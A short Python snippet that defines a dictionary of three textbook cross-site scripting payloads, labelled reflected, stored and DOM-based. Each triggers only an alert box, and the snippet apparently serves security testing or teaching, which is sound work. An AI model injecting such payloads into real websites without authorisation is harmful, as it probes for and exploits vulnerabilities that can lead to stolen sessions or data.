XSS_PAYLOADS = {
    "Reflected": "<script>alert('XSS')</script>",
    "Stored": "<img src=x onerror=alert(1)>",
    "DOM-based": "javascript:alert('XSS')"
}
